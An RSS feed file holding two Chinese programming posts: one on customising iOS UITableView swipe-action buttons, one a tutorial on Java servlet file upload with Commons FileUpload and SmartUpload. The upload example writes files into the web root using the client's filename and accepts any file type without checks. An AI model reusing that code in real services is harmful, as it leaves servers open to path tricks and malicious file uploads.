<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>iOS UITableView左滑操作功能的实现（iOS8-11） - 腾讯WeTest</title>
<link>http://www.cnblogs.com/wetest/p/8428735.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/wetest/p/8428735.html</guid>
<description>&lt;p&gt;&lt;span&gt;&lt;strong&gt;WeTest 导读&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;本文主要是介绍下iOS 11系统及iOS 11之前的系统在实现左滑操作功能上的区别，及如何自定义左滑的标题颜色、字体大小。&lt;/p&gt;
&lt;hr/&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;一、左滑操作功能实现&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;1、&lt;/strong&gt;如果左滑的时候只有一个操作按钮，可以使用如下三个delegate方法来实现：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/992994/201802/992994-20180207222349732-1879658204.png&quot; alt=&quot;&quot;/&gt; &lt;/p&gt;

&lt;p&gt;&lt;strong&gt;2、&lt;/strong&gt;如果左滑有一个或多个操作按钮，iOS8-10 可使用如下两个delegate&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/992994/201802/992994-20180207222413326-1202240555.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;p&gt;&lt;strong&gt;3、&lt;/strong&gt;iOS 11之后，tableView的delegate增加了两个方法，用来取代editActionsForRowAtIndexPath方法，如下：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/992994/201802/992994-20180207222433248-1138441463.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;p&gt;在2和3中，如果是需要适配iOS 11之前的版本，以上三个方法都需要实现。&lt;/p&gt;


&lt;p&gt;&lt;strong&gt;4、&lt;span&gt;上面1.2和1.3中实现的方法的区别&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;体验上的不同就是当左滑只有一个button时，iOS 11中可以一直左滑，滑到一定程度时，会执行点击按钮的操作，iOS 11之前的不会。&lt;/p&gt;

&lt;p&gt;iOS 11之前如果想增大button区域，可通过在标题前后加空格的方式，但iOS 11不行，加空格无效，button大小固定，超过4个字时换行显示。&lt;/p&gt;



&lt;p&gt;&lt;span&gt;&lt;strong&gt;二、左滑操作自定义标题颜色、字体&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;因为系统对左滑出的按钮只提供了3个可设置的属性：title、backgroundColor、image，如果使用自定义的titleColor和font，就需要自己来实现了。实现的思想是hook系统实现，但鉴于UITableView的view层级结构在iOS 11中有所改变，所以iOS8-10和iOS11的实现有所不同，以下分别给出。&lt;/p&gt;

&lt;p&gt;考虑到代码的可复用性，自定义左滑操作的字体大小和颜色的代码不写在viewController中，而是写在UITableView和UITableViewCell的Category中，对外提供editActionTitleColor和editActionTitleFont属性来设置颜色和大小，需要使用自定义颜色和字体时只需要设置一下这两个属性即可。&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;1、iOS 8-10 设置标题颜色和字体&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;左滑操作后，UITableView的层级结构如下图：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/992994/201802/992994-20180207222617716-1599369065.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;p&gt;由上图可知，左滑的操作按钮是在UITableViewCell的子view，所以我们可以在UITableViewCell的category中hook掉layoutSubviews方法，找到UITableViewCellDeleteConfirmationView的子view button，设置字体颜色和大小。&lt;/p&gt;

&lt;p&gt;代码如下：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/992994/201802/992994-20180207222634623-352399819.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;p&gt;&lt;span&gt;&lt;strong&gt;2、 iOS 11 设置标题颜色和字体&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;左滑操作后，UITableView的层级结构如下图：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/992994/201802/992994-20180207222710685-1293556535.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;p&gt;由上图可知，左滑的操作按钮是在UITableView的子view，所以我们可以在UITableView的category中hook掉layoutSubviews方法，找到UISwipeActionPullView的子view button，设置字体颜色和大小。&lt;/p&gt;

&lt;p&gt;代码如下：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/992994/201802/992994-20180207222728373-604963861.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;



&lt;p&gt;&lt;span&gt;&lt;strong&gt;三、遇到的问题及原因分析&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;1、&lt;span&gt;问题是iOS 11上设置颜色有延迟，颜色有一个明显的跳变，从系统默认色跳转到我设置的颜色&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt; &lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;有问题的代码如下：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/992994/201802/992994-20180207222807013-1970174472.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;2、&lt;span&gt;&lt;span&gt;问题原因分析&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;当左滑一个cell后，直接操作左滑另一个cell，这个时候tableView上会有两个UISwipeActionPullView，此时tableView的部分view层级如下图所示：&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://images2017.cnblogs.com/blog/992994/201802/992994-20180207222850873-190146898.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;p&gt;而上面的代码，在__findSwipActionButton方法中，找到其中一个UISwipeActionPullView上面的button就直接返回了，没有设置第二个UISwipeActionPullView的button的颜色，导致显示了系统默认色。&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;3、解决方法&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;将以上有问题的代码修改为以下代码：找出所有的UISwipeActionPullView，返回UISwipeActionPullView的button数组，对button数组进行设置字体颜色和大小，这个数组最多有两个元素，因为左滑出下一个cell时，上一个cell会逐渐消失，当此cell左滑操作完成时，上一个左滑的cell也会完成消失。&lt;/p&gt;

&lt;p&gt;解决后的代码如二（2）的示例代码。&lt;/p&gt;

&lt;hr/&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;腾讯WeTest iOS预审工具&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;为了提高IEG苹果审核通过率，腾讯专门成立了苹果审核测试团队，打造出iOS预审工具这款产品。经过1年半的内部运营，腾讯内部应用的iOS审核通过率从平均35%提升到90%+。&lt;/p&gt;

&lt;p&gt;现将腾讯内部产品的过审经验，以线上工具的形式共享给各位。在WeTest腾讯质量开放平台上可以在线使用。&lt;span&gt;&lt;strong&gt;点击 &lt;a href=&quot;http://wetest.qq.com/product/ios?from=content_cnblogs&quot;&gt;http://wetest.qq.com/product/ios&lt;/a&gt; 即可立即体验！&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;如果使用当中有任何疑问，欢迎联系腾讯WeTest企业QQ：800024531&lt;/span&gt;&lt;/p&gt;

&lt;hr/&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;iOS预审服务&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;【扫描工具】&lt;/strong&gt;上传IPA包、图片、视频、应用描述即可进行测试； 多维度自动扫描提审材料的被拒风险；1小时内反馈全面的扫描报告。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;【专家预审】&lt;/strong&gt;腾讯专家为您遍历App所有功能模块；全面暴露App内容被拒风险；跟进问题直至上线（需提供官方拒绝邮件）。&lt;/p&gt;
&lt;p&gt;&lt;br/&gt;&lt;strong&gt;【专家咨询】&lt;/strong&gt;资深预审专家一对一服务； 咨询时间灵活可选，按需购买；有的放矢解 决审核问题。&lt;/p&gt;
&lt;p&gt;&lt;br/&gt;&lt;strong&gt;【ASO优化】&lt;/strong&gt;专业团队多维度深度剖析App的ASO现状；围绕App目标用户群筛选高 度关联的关键词；帮助提升App在苹果应用商店中的曝光率。&lt;/p&gt;










</description>
<pubDate>Wed, 07 Feb 2018 14:31:00 +0000</pubDate>
<dc:creator>腾讯WeTest</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/wetest/p/8428735.html</dc:identifier>
</item>
<item>
<title>Java文件上传细讲 - Java3y</title>
<link>http://www.cnblogs.com/Java3y/p/8428591.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/Java3y/p/8428591.html</guid>
<description>&lt;p&gt;文件上传就是把用户的信息保存起来。&lt;/p&gt;

&lt;p&gt;在用户注册的时候，可能需要用户提交照片。那么这张照片就应该要进行保存。&lt;/p&gt;

&lt;h2 id=&quot;为什么我们要使用上传工具&quot;&gt;为什么我们要使用上传工具？&lt;/h2&gt;
&lt;p&gt;为啥我们需要上传组件呢？当我们要获取客户端的数据，我们一般是通过getParameter()方法来获取的。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;上传文件数据是经过MIME协议进行分割的，表单进行了二进制封装。也就是说：getParameter()无法获取得到上传文件的数据。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;我们首先来看看&lt;strong&gt;文件上传http是怎么把数据带过去的&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;jsp页面，&lt;strong&gt;表单一定要指定enctype:multipart/form-data&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;sourceCode&quot; readability=&quot;10&quot;&gt;
&lt;pre class=&quot;sourceCode html&quot;&gt;
&lt;code class=&quot;sourceCode html&quot;&gt;
    &lt;span class=&quot;kw&quot;&gt;&amp;lt;form&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; action=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;${pageContext.request.contextPath }/servlet/UploadServlet1&quot;&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; enctype=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;multipart/form-data&quot;&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; method=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;post&quot;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;&amp;gt;&lt;/span&gt;
        上传用户：&lt;span class=&quot;kw&quot;&gt;&amp;lt;input&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; type=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;text&quot;&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; name=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;username&quot;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;&amp;gt;&amp;lt;br/&amp;gt;&lt;/span&gt;
        上传文件1：&lt;span class=&quot;kw&quot;&gt;&amp;lt;input&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; type=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;file&quot;&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; name=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;file1&quot;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;&amp;gt;&amp;lt;br/&amp;gt;&lt;/span&gt;
        上传文件2：&lt;span class=&quot;kw&quot;&gt;&amp;lt;input&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; type=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;file&quot;&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; name=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;file2&quot;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;&amp;gt;&amp;lt;br/&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;kw&quot;&gt;&amp;lt;input&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; type=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;submit&quot;&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; value=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;提交&quot;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;kw&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;http抓包&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;http://img.blog.csdn.net/20170326194205188?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaG9uXzN5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast&quot; alt=&quot;这里写图片描述&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;尝试在Servlet上使用getParameter()获取数据&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;sourceCode&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;sourceCode java&quot;&gt;
&lt;code class=&quot;sourceCode java&quot;&gt;

        String ss = request.&lt;span class=&quot;fu&quot;&gt;getParameter&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;username&quot;&lt;/span&gt;);
        System.&lt;span class=&quot;fu&quot;&gt;out&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;println&lt;/span&gt;(ss);&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;直接使用getParameter是获取不到数据的。&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;http://img.blog.csdn.net/20170326194423558?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaG9uXzN5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast&quot; alt=&quot;这里写图片描述&quot;/&gt;&lt;/p&gt;
&lt;p&gt;那么我们要怎么办呢？？？？&lt;strong&gt;request对象提供了ServletInputStream流给我们读取数据&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;我们试着读取下文件&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;sourceCode&quot; readability=&quot;10&quot;&gt;
&lt;pre class=&quot;sourceCode java&quot;&gt;
&lt;code class=&quot;sourceCode java&quot;&gt;
        ServletInputStream inputStream = request.&lt;span class=&quot;fu&quot;&gt;getInputStream&lt;/span&gt;();

        &lt;span class=&quot;dt&quot;&gt;byte&lt;/span&gt;[] bytes = &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;byte&lt;/span&gt;[&lt;span class=&quot;dv&quot;&gt;1024&lt;/span&gt;];
        &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; len = &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;;

        &lt;span class=&quot;kw&quot;&gt;while&lt;/span&gt; ((len = inputStream.&lt;span class=&quot;fu&quot;&gt;read&lt;/span&gt;(bytes)) &amp;gt; &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;) {
            System.&lt;span class=&quot;fu&quot;&gt;out&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;println&lt;/span&gt;(&lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; String(bytes, &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;, len));
        }&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;在jsp页面多增添一个input控件&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;sourceCode&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;sourceCode html&quot;&gt;
&lt;code class=&quot;sourceCode html&quot;&gt;
&lt;span class=&quot;kw&quot;&gt;&amp;lt;input&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; type=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;text&quot;&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt; name=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;password&quot;&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;我上传的文本文件内容就是111111，读取效果如下：&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;http://img.blog.csdn.net/20170326195601173?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaG9uXzN5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast&quot; alt=&quot;这里写图片描述&quot;/&gt;&lt;/p&gt;
&lt;p&gt;现在我们能够读取上传文件的数据了，但是现在问题又来了：&lt;strong&gt;怎么把文件上传个数据和普通传送给服务器的数据分割开来呢？？？&lt;/strong&gt;上面在图上我们已经看到了，他们是混合在一起的。&lt;/p&gt;
&lt;p&gt;按我们平常的做法是很难分割开来的，所以我们需要上传组件&lt;/p&gt;
&lt;hr/&gt;&lt;h2 id=&quot;上传组件有两种&quot;&gt;上传组件有两种&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;FileUpload【操作比较复杂】&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;SamrtUpload【操作比较简单】&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;hr/&gt;
&lt;p&gt;要使用FileUpload组件，就需要导入两个jar包&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;commons-io&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Commons-fileupload&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;开发步骤&quot;&gt;开发步骤&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;创建解析器工厂对象【DiskFileItemFactory】&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;通过解析器工厂创建解析器【ServletFileUpload】&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;调用解析器方法解析request对象，得到所有上传的内容【list】&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;遍历list，判断每个对象是否是上传文件&lt;/strong&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;如果是普通表单字段，得到字段名和字段值&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;如果是上传文件，调用InputSteam方法得到输入流，读取上传的数据&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;hr/&gt;&lt;h2 id=&quot;快速入门&quot;&gt;快速入门&lt;/h2&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;12&quot;&gt;
&lt;pre class=&quot;sourceCode java&quot;&gt;
&lt;code class=&quot;sourceCode java&quot;&gt;

        &lt;span class=&quot;kw&quot;&gt;try&lt;/span&gt;{
        
            &lt;span class=&quot;co&quot;&gt;//1.得到解析器工厂&lt;/span&gt;
            DiskFileItemFactory factory = &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;DiskFileItemFactory&lt;/span&gt;();
            
            &lt;span class=&quot;co&quot;&gt;//2.得到解析器&lt;/span&gt;
            ServletFileUpload upload = &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;ServletFileUpload&lt;/span&gt;(factory);
            
            &lt;span class=&quot;co&quot;&gt;//3.判断上传表单的类型&lt;/span&gt;
            &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt;(!upload.&lt;span class=&quot;fu&quot;&gt;isMultipartContent&lt;/span&gt;(request)){
                &lt;span class=&quot;co&quot;&gt;//上传表单为普通表单，则按照传统方式获取数据即可&lt;/span&gt;
                &lt;span class=&quot;kw&quot;&gt;return&lt;/span&gt;;
            }
            
            &lt;span class=&quot;co&quot;&gt;//为上传表单，则调用解析器解析上传数据&lt;/span&gt;
            List&amp;lt;FileItem&amp;gt; list = upload.&lt;span class=&quot;fu&quot;&gt;parseRequest&lt;/span&gt;(request);  &lt;span class=&quot;co&quot;&gt;//FileItem&lt;/span&gt;
            
            &lt;span class=&quot;co&quot;&gt;//遍历list，得到用于封装第一个上传输入项数据fileItem对象&lt;/span&gt;
            &lt;span class=&quot;kw&quot;&gt;for&lt;/span&gt;(FileItem item : list){
                
                &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt;(item.&lt;span class=&quot;fu&quot;&gt;isFormField&lt;/span&gt;()){
                    &lt;span class=&quot;co&quot;&gt;//得到的是普通输入项&lt;/span&gt;
                    String name = item.&lt;span class=&quot;fu&quot;&gt;getFieldName&lt;/span&gt;();  &lt;span class=&quot;co&quot;&gt;//得到输入项的名称&lt;/span&gt;
                    String value = item.&lt;span class=&quot;fu&quot;&gt;getString&lt;/span&gt;();
                    System.&lt;span class=&quot;fu&quot;&gt;out&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;println&lt;/span&gt;(name + &lt;span class=&quot;st&quot;&gt;&quot;=&quot;&lt;/span&gt; + value);
                }&lt;span class=&quot;kw&quot;&gt;else&lt;/span&gt;{
                    &lt;span class=&quot;co&quot;&gt;//得到上传输入项&lt;/span&gt;
                    String filename = item.&lt;span class=&quot;fu&quot;&gt;getName&lt;/span&gt;();  &lt;span class=&quot;co&quot;&gt;//得到上传文件名  C:\Documents and Settings\ThinkPad\桌面\1.txt&lt;/span&gt;
                    filename = filename.&lt;span class=&quot;fu&quot;&gt;substring&lt;/span&gt;(filename.&lt;span class=&quot;fu&quot;&gt;lastIndexOf&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;&lt;/span&gt;)+&lt;span class=&quot;dv&quot;&gt;1&lt;/span&gt;);
                    InputStream in = item.&lt;span class=&quot;fu&quot;&gt;getInputStream&lt;/span&gt;();   &lt;span class=&quot;co&quot;&gt;//得到上传数据&lt;/span&gt;
                    &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; len = &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;;
                    &lt;span class=&quot;dt&quot;&gt;byte&lt;/span&gt; buffer[]= &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;byte&lt;/span&gt;[&lt;span class=&quot;dv&quot;&gt;1024&lt;/span&gt;];
                    
                    
                    String savepath = &lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;getServletContext&lt;/span&gt;().&lt;span class=&quot;fu&quot;&gt;getRealPath&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;/upload&quot;&lt;/span&gt;);
                    FileOutputStream out = &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; FileOutputStream(savepath + &lt;span class=&quot;st&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&quot;&lt;/span&gt; + filename);  &lt;span class=&quot;co&quot;&gt;//向upload目录中写入文件&lt;/span&gt;
                    &lt;span class=&quot;kw&quot;&gt;while&lt;/span&gt;((len=in.&lt;span class=&quot;fu&quot;&gt;read&lt;/span&gt;(buffer))&amp;gt;&lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;){
                        out.&lt;span class=&quot;fu&quot;&gt;write&lt;/span&gt;(buffer, &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;, len);
                    }
                    
                    in.&lt;span class=&quot;fu&quot;&gt;close&lt;/span&gt;();
                    out.&lt;span class=&quot;fu&quot;&gt;close&lt;/span&gt;();
                }
            }
        
        }&lt;span class=&quot;kw&quot;&gt;catch&lt;/span&gt; (Exception e) {
            e.&lt;span class=&quot;fu&quot;&gt;printStackTrace&lt;/span&gt;();
        }&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;测试&quot;&gt;测试&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;普通的字段和上传的文件都能读取得到了！&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;http://img.blog.csdn.net/20170326223432688?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaG9uXzN5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast&quot; alt=&quot;这里写图片描述&quot;/&gt;&lt;/p&gt;
&lt;hr/&gt;
&lt;p&gt;要使用SmartUpload组件，就需要&lt;strong&gt;导入smartupload.jar开发包&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;快速入门-1&quot;&gt;快速入门&lt;/h2&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;12&quot;&gt;
&lt;pre class=&quot;sourceCode java&quot;&gt;
&lt;code class=&quot;sourceCode java&quot;&gt;

        &lt;span class=&quot;co&quot;&gt;//实例化组件&lt;/span&gt;
        SmartUpload smartUpload = &lt;span class=&quot;kw&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;SmartUpload&lt;/span&gt;();

        &lt;span class=&quot;co&quot;&gt;//初始化上传操作&lt;/span&gt;
        smartUpload.&lt;span class=&quot;fu&quot;&gt;initialize&lt;/span&gt;(&lt;span class=&quot;kw&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;getServletConfig&lt;/span&gt;(), request, response);


        &lt;span class=&quot;kw&quot;&gt;try&lt;/span&gt; {

            &lt;span class=&quot;co&quot;&gt;//上传准备&lt;/span&gt;
            smartUpload.&lt;span class=&quot;fu&quot;&gt;upload&lt;/span&gt;();

            &lt;span class=&quot;co&quot;&gt;//对于普通数据，单纯到request对象是无法获取得到提交参数的。也是需要依赖smartUpload&lt;/span&gt;
            String password = smartUpload.&lt;span class=&quot;fu&quot;&gt;getRequest&lt;/span&gt;().&lt;span class=&quot;fu&quot;&gt;getParameter&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;password&quot;&lt;/span&gt;);
            System.&lt;span class=&quot;fu&quot;&gt;out&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;println&lt;/span&gt;(password);

            &lt;span class=&quot;co&quot;&gt;//上传到uploadFile文件夹中&lt;/span&gt;
            smartUpload.&lt;span class=&quot;fu&quot;&gt;save&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&quot;uploadFile&quot;&lt;/span&gt;);


        } &lt;span class=&quot;kw&quot;&gt;catch&lt;/span&gt; (SmartUploadException e) {
            e.&lt;span class=&quot;fu&quot;&gt;printStackTrace&lt;/span&gt;();
        }&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&quot;测试-1&quot;&gt;测试&lt;/h2&gt;
&lt;p&gt;同样地，&lt;strong&gt;我们可以上传文件到uploadFile文件夹中。代码量也的确减少很多！&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;也能够获取普通字段的参数&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://img.blog.csdn.net/20170327094141204?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaG9uXzN5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast&quot; alt=&quot;这里写图片描述&quot;/&gt;&lt;/p&gt;
&lt;hr/&gt;
